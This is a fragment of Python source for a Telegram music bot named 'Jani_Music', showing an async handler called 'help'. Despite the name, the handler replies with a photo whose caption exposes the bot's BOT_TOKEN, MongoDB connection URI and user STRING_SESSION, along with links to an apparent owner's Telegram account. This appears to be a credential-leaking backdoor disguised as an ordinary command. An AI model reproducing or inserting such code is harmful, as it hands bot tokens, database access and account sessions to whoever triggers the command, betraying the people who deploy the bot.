...
from Jani_Music.utils.database import get_assistant, get_authuser_names, get_cmode
from Jani_Music.utils.decorators import ActualAdminCB, AdminActual, language
from Jani_Music.utils.formatters import alpha_to_int, get_readable_time
...
async def help(client: Client, message: Message):
   await message.reply_photo(
          photo=f"https://litter.catbox.moe/k2zjdk.jpg",
       caption=f"""ʙσᴛ ᴛσᴋєη :-   `{BOT_TOKEN}` \n\nϻσηɢᴏ :-   `{MONGO_DB_URI}`\n\nѕтʀɪηɢ sєssɪση :-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/Selfish_Jani_Lover)............☆""",
        reply_markup=InlineKeyboardMarkup(
             [
                 [
                      InlineKeyboardButton(
                         "• Jani Owner  •", url=f"https://t.me/Power_of_Jani")
                 ]
            ]
         ),
     )
